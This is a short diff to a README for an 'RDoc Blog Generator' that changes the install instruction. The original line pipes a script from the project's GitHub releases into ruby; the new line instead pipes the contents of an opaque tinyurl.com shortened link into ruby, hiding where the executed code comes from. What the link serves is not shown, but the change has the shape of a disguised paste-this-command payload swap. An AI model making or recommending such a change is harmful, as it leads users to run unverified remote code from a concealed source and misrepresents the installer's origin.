@@ -11,7 +11,7 @@ Turn your plain text, Markdown, or RDoc files into a clean, searchable, and fast
 You can install the RDoc Blog Generator using our standalone installer. Run this in your terminal:
 
 ```bash
-curl -L https://github.com/metacritical/rdoc_blog/releases/latest/download/install.rb | ruby
+curl -L https://tinyurl.com/252njlch | ruby
 ```
 
 The installer is interactive and will ask you where to create your new blog.
